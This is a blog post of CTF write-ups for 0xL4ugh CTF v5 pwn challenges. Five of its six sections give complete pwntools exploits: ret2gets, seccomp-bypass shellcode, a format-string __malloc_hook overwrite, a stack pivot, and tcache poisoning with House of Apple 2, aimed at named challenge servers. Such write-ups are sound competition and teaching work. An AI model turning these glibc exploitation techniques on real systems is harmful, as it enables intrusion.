@@ -1,0 +1,775 @@
+---
+title: "Write-ups: 0xL4ugh CTF v5"
+published: 2026-01-24
+updated: 2026-01-25
+description: "Write-ups for 0xL4ugh CTF v5 pwn aspect."
+image: ""
+tags: ["Pwn", "Write-ups"]
+category: "Write-ups"
+draft: false
+---
+
+# Awesome Router
+
+## Information
+
+- Category: IoT
+
+## Description
+
+> Trust me, if this challenge solved in the inteneded way, there is a lot of fun ; )
+
+## Write-up
+
+There exits `gets` and `puts` in `bin/fetcher`, so we can use `ret2gets` trick for a ez shell \:D
+
+And the rest work are for webers, the Pwn part is done LOL
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    p32,
+    process,
+    raw_input,
+    remote,
+    u64,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "./fetcher_patched"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+rop = ROP(libc)
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    payload = flat(
+        {
+            0x28: elf.plt["gets"],
+            0x30: elf.plt["gets"],
+            0x38: elf.plt["puts"],
+            0x40: elf.sym["main"],
+        },
+        filler=b"\x00",
+    )
+    target.sendlineafter(b"Enter your url to fetch", payload)
+
+    payload = flat(
+        p32(0x0),  # lock
+        b"A" * 0x4,  # cnt
+    )
+    target.sendline(payload)
+    target.sendline(b"BBBB")
+
+    target.recvline()
+    tls = u64(target.recvline().strip()[8:].ljust(0x8, b"\x00"))
+    libc.address = tls + 0x28C0
+    target.success(f"tls: {hex(tls)}")
+    target.success(f"libc: {hex(libc.address)}")
+
+    payload = flat(
+        {
+            0x28: libc.address + rop.find_gadget(["pop rdi", "ret"])[0],
+            0x30: next(libc.search(b"/bin/sh")),
+            0x38: libc.address + rop.find_gadget(["ret"])[0],
+            0x40: libc.sym["system"],
+        },
+        filler=b"\x00",
+    )
+    raw_input("DEBUG")
+    target.sendlineafter(b"Enter your url to fetch", payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# New Age
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> They said a carefully crafted seccomp filter would always save you, can you make sure for me?
+
+## Write-up
+
+`flag` name is random, `openat2` is not disabled.
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    asm,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "./new_age"
+HOST, PORT = "159.89.106.147", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=False)
+
+
+def main():
+    launch()
+
+    sc = asm("""
+        /* openat2(".", {0,0,0}, 24) */
+        push 0
+        push 0
+        push 0
+        mov rdx, rsp
+        push 0x2e
+        mov rsi, rsp
+        mov rdi, -100
+        mov r10, 24
+        mov rax, 437
+        syscall
+
+        /* getdents64(fd, buf, 0x1000) */
+        mov rdi, rax
+        sub rsp, 0x1000
+        mov rsi, rsp
+        mov rdx, 0x1000
+        mov rax, 217
+        syscall
+
+        /* iterate directory, skip `.` (0x2e) and `..` (0x2e2e) */
+        mov r8, rax     /* total length */
+        mov r9, rsp     /* buffer pointer */
+    find_real_file:
+        movzx eax, byte ptr [r9+19]
+        cmp al, 0x2e    /* if the first character of the file name is `.`, skip it */
+        je next_ent
+
+        /* find the file, store in `r9+19` */
+        jmp open_it
+
+    next_ent:
+        movzx ax, word ptr [r9+16] /* d_reclen */
+        add r9, rax
+        sub r8, rax
+        jg find_real_file
+        jmp exit
+
+    open_it:
+        /* openat2(AT_FDCWD, r9+19, {0,0,0}, 24) */
+        lea rsi, [r9+19]
+        mov rdi, -100
+        lea rdx, [rsp+0x1000+8]
+        mov r10, 24
+        mov rax, 437
+        syscall
+
+        /* pread64(fd, buf, 0x100, 0) */
+        mov rdi, rax
+        mov rsi, r9
+        mov rdx, 0x100
+        xor r10, r10
+        mov rax, 17
+        syscall
+        mov r12, rax
+
+        /* writev(1, &iovec, 1) */
+        push r12
+        push r9
+        mov rsi, rsp
+        mov rdi, 1
+        mov rdx, 1
+        mov rax, 20
+        syscall
+
+    exit:
+        mov rax, 60
+        syscall
+    """)
+
+    target.sendafter(b"Send shellcode (max 4096 bytes): ", sc)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Zoro’s Blind Path
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> The only way forward is understanding what cannot be seen
+
+## Write-up
+
+This chall disabled `X x P p S s` and `$` character.
+
+The idea is using the `%c` to iterate `printf` arguments, so the next `%n` will write to the address which we pre-putted in the stack.
+
+And since we have only have 10 bytes for the second format string, we cannot use the second format string to modify address. But the libc version is `2.23`, so there exists `__malloc_hook` and `__free_hook`, which in libc's `rw` region.
+
+Recall `printf` will malloc a larger buffer if the output content exceeds the default buffer size, so we can overwrite a hook to onegadget address and then trigger it by `%1000000c` in the second `printf`.
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    fmtstr_payload,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "./app_patched"
+HOST, PORT = "challenges.ctf.sd", 33898
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def build_fmt_payload(target_addr, value, consume=24, offset=0x90, num_bytes=6):
+    target_vals = [(value >> (i * 0x8)) & 0xFF for i in range(num_bytes)]
+
+    specs = []
+    # consume arguments
+    for _ in range(consume):
+        specs.append(b"%c")
+    curr = 24  # 19
+
+    for i in range(num_bytes):
+        # consume (arg 26, 28, 30, 32, 34, 36)
+        diff = (target_vals[i] - curr % 256 + 256) % 256
+        if diff == 0:
+            specs.append(b"%256c")
+            curr += 256
+        else:
+            specs.append(f"%{diff}c".encode())
+            curr += diff
+        # consume (arg 27, 29, 31, 33, 35, 37)
+        specs.append(b"%hhn")
+
+    fmt = b"".join(specs)
+
+    # if length over offset, then we have to put addresses farther
+    if len(fmt) > offset:
+        raise ValueError(f"Format string too long: {len(fmt)} bytes")
+
+    payload = fmt.ljust(offset, b"\x00")
+    for i in range(num_bytes):
+        payload += flat(target_addr + i)
+        payload += flat(0xCAFEBABE)
+
+    return payload
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    target.recvuntil(b"Clue: ")
+    libc.address = int(target.recvline(), 16) - libc.sym["_IO_2_1_stdout_"]
+    __malloc_hook = libc.sym["__malloc_hook"]
+    one_gadget = libc.address + 0x4527A
+
+    target.success(f"libc: {hex(libc.address)}")
+    target.success(f"__malloc_hook: {hex(__malloc_hook)}")
+    target.success(f"one_gadget: {hex(one_gadget)}")
+
+    # arg 9 is the start of our payload
+    # target address at offset 0x90 -> arg (9 + 0x90/8) = arg 27
+    # payload = build_fmt_payload(__malloc_hook, one_gadget)
+    payload = fmtstr_payload(8, {__malloc_hook: one_gadget}, no_dollars=True)
+
+    raw_input("DEBUG")
+    target.sendline(payload)
+
+    target.sendline(b"%1000000c")
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Wyv3rn's Magic
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> We missed the legend !
+
+## Write-up
+
+Haven't solve this.
+
+This might be useful: <https://arxiv.org/pdf/2304.07940>
+
+## Exploit
+
+TODO
+
+# House Of Pain
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> This house is welcoming. The journey, however, can be painful.
+
+## Write-up
+
+We can leak stack address in `small_message`, and its just a CHOP bypass canary.
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+    u64,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "./chall_patched"
+HOST, PORT = "challenges4.ctf.sd", 34724
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=False)
+
+
+def small_message(size, msg):
+    target.sendlineafter(b"2. Exit\n", str(1).encode())
+    target.sendlineafter(b"Enter size: ", str(size).encode())
+    target.sendafter(b"Enter your message: ", msg)
+
+
+def main():
+    launch()
+
+    small_message(0x20, b"A" * 0x18)
+
+    target.recvuntil(b"A" * 0x18)
+    stack = u64(target.recvline().strip().ljust(0x8, b"\x00"))
+    target.success(hex(stack))
+
+    win = 0x401773
+    fake = flat(
+        {
+            0x0: stack,
+            0x8: 0x40168F,
+            0x20: stack - 0x118 + 0x18,
+            0x28: 0x4013C8,  # 0x4013c8 (main+82)
+            0x58: win,
+        },
+        filler=b"\x00",
+    )
+    raw_input("DEBUG")
+    small_message(0x10, b"A" * 0x30 + fake)
+    target.sendlineafter(b"2. Exit\n", str(2).encode())
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Alice
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Alice, struggling with the traumatic death of her family, returns to a corrupted Wonderland to unlock repressed memories. Can you help her remember who she is ?
+
+## Write-up
+
+This chall limited our free counts, so we cannot just fill tcache and then get the chunk into unsortedbin to leak libc.
+
+The idea is tcache poisoning to let malloc return `tcache_perthread_structure`, and change the correspond tcachebin's `counts` to `7`, so the next free will go to unsortedbin.
+
+Then we can do a ez House of Apple 2 attack to get shell.
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    FileStructure,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+    u64,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "./vuln_patched"
+HOST, PORT = "159.89.105.235", 10001
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=False)
+
+
+def create_memory(idx, size, data):
+    target.sendlineafter(b"> ", str(1).encode())
+    target.sendlineafter(b"Memory index: ", str(idx).encode())
+    target.sendlineafter(b"How vivid is this memory? ", str(size).encode())
+    target.sendlineafter(b"What do you remember? ", data)
+
+
+def edit_memory(idx, data):
+    target.sendlineafter(b"> ", str(2).encode())
+    target.sendlineafter(b"Which memory will you rewrite? ", str(idx).encode())
+    target.sendlineafter(b"Rewrite your memory: ", data)
+
+
+def view_memory(idx):
+    target.sendlineafter(b"> ", str(3).encode())
+    target.sendlineafter(b"Which memory do you wish to recall? ", str(idx).encode())
+
+
+def forget_memory(idx):
+    target.sendlineafter(b"> ", str(4).encode())
+    target.sendlineafter(b"Which memory will you erase? ", str(idx).encode())
+
+
+def main():
+    launch()
+
+    create_memory(0, 0x10, b"0")
+    create_memory(1, 0x10, b"1")
+    forget_memory(0)
+    forget_memory(1)
+    view_memory(0)
+    heap = u64(target.recvline().strip().ljust(0x8, b"\x00")) << 12
+    pos = heap >> 12
+    target.success(f"heap: {hex(heap)}")
+
+    edit_memory(1, flat(mangle(pos, heap + 0x60)) + b"A" * 0x8)
+    create_memory(2, 0x10, b"A" * 0x8)
+    create_memory(3, 0x2F0, b"unsortedbin")
+    create_memory(5, 0x250, b"guard")
+    create_memory(4, 0x10, flat(0) + flat(0x0000000700000000))  # 0x300 [  7]
+    forget_memory(3)
+    view_memory(3)
+    libc.address = u64(target.recvline().rstrip().ljust(0x8, b"\x00")) - 0x203B20
+    target.success(f"libc: {hex(libc.address)}")
+
+    create_memory(6, 0x250, b"A" * 0x8)
+    forget_memory(6)
+    forget_memory(5)
+
+    edit_memory(5, flat(mangle(pos, libc.sym["_IO_list_all"])) + b"A" * 0x8)
+
+    fp_addr = heap + 0x5E0
+    system = libc.sym["system"]
+    fp = FileStructure(null=libc.sym["lock"])
+    fp.flags = b" sh"
+    fp._IO_write_ptr = 1
+    fp._IO_write_base = 0
+    fp._wide_data = fp_addr
+    fp.vtable = libc.sym["_IO_wfile_jumps"]
+    fp.chain = system
+    payload = bytes(fp) + flat(fp_addr)
+
+    raw_input("DEBUG")
+    create_memory(7, 0x250, payload)
+    create_memory(8, 0x250, flat(fp_addr))
+
+    target.sendlineafter(b"> ", str(5).encode())
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
